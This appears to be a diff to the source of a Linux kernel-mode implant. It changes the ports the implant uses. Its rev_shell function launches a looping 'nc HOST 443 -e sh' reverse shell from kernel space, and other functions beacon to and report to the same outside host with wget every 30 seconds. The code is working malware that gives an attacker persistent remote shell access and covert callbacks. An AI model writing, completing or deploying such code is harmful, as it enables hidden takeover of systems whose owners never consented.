@@ -107,9 +107,9 @@ static int handler_pre2(struct kprobe *p, struct pt_regs *regs) {
 // initiate rev shell
 static void rev_shell(void) {
 	char *shell;
-	int size = strlen("while true; do nc ") + strlen(host) + strlen(" 53 -e sh; sleep 30; done") + 1;
+	int size = strlen("while true; do nc ") + strlen(host) + strlen(" 443 -e sh; sleep 30; done") + 1;
 	shell = kmalloc(size, GFP_KERNEL);
-	snprintf(shell, size, "while true; do nc %s 53 -e sh; sleep 30; done", host);
+	snprintf(shell, size, "while true; do nc %s 443 -e sh; sleep 30; done", host);
 	char *argv[] = {"/bin/sh", "-c", shell, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
@@ -117,9 +117,9 @@ static void rev_shell(void) {
 //function to make a request every 30s
 static void make_request_periodic(void) {
 	char *str;
-	int size = strlen("while true; do wget http://") + strlen(host) + strlen(":443/UP; sleep 30; done") + 1;
+	int size = strlen("while true; do wget http://") + strlen(host) + strlen(":123/UP; sleep 30; done") + 1;
 	str = kmalloc(size, GFP_KERNEL);
-	snprintf(str, size, "while true; do wget http://%s:443/UP; sleep 30; done", host);
+	snprintf(str, size, "while true; do wget http://%s:123/UP; sleep 30; done", host);
 	char *argv[] = {"/bin/sh", "-c", str, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
@@ -127,9 +127,9 @@ static void make_request_periodic(void) {
 // function to make requests with a specified string
 static void make_request(char *str) {
 	char *command;
-	int size = strlen("http://") + strlen(host) + strlen(":443/") + strlen(str) + 1;
+	int size = strlen("http://") + strlen(host) + strlen(":123/") + strlen(str) + 1;
 	command = kmalloc(size, GFP_KERNEL);
-	snprintf(command, size, "http://%s:443/%s", host, str);
+	snprintf(command, size, "http://%s:123/%s", host, str);
 	char *argv[] = {"/usr/bin/wget", command, NULL};
 	call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 	kfree(command);
